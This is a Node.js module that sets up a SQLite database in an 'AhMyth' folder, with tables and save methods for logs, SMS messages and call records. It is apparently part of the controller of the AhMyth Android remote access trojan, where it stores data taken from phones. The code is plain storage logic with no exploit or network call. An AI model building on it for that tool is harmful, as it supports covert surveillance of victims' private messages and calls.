const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs-extra');
const homedir = require('node-homedir');

class Database {
    constructor() {
        const dataPath = path.join(homedir(), 'AhMyth');
        fs.ensureDirSync(dataPath);
        const dbPath = path.join(dataPath, 'ahmyth.db');
        
        this.db = new sqlite3.Database(dbPath, (err) => {
            if (err) {
                console.error('Could not connect to database', err);
            } else {
                console.log('Connected to SQLite database');
                this.initTables();
            }
        });
    }

    initTables() {
        const schemas = [
            `CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                type TEXT,
                message TEXT,
                status TEXT
            )`,
            `CREATE TABLE IF NOT EXISTS sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                message TEXT,
                date TEXT,
                type INTEGER
            )`,
            `CREATE TABLE IF NOT EXISTS calls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                name TEXT,
                duration TEXT,
                type INTEGER,
                date DATETIME DEFAULT CURRENT_TIMESTAMP
            )`
        ];

        schemas.forEach(schema => {
            this.db.run(schema, (err) => {
                if (err) console.error('Error creating table:', err);
            });
        });
    }

    log(type, message, status) {
        this.db.run(
            `INSERT INTO logs (type, message, status) VALUES (?, ?, ?)`,
            [type, message, status],
            (err) => {
                if (err) console.error('Error inserting log:', err);
            }
        );
    }

    saveSMS(smsList) {
        const stmt = this.db.prepare(`INSERT INTO sms (phone, message, date, type) VALUES (?, ?, ?, ?)`);
        smsList.forEach(sms => {
            stmt.run(sms.phoneNo, sms.msg, sms.date, sms.type);
        });
        stmt.finalize();
    }
    
    saveCalls(callsList) {
         const stmt = this.db.prepare(`INSERT INTO calls (phone, name, duration, type) VALUES (?, ?, ?, ?)`);
         callsList.forEach(call => {
             stmt.run(call.phoneNo, call.name, call.duration, call.type);
         });
         stmt.finalize();
    }

    close() {
        this.db.close();
    }
}

module.exports = new Database();

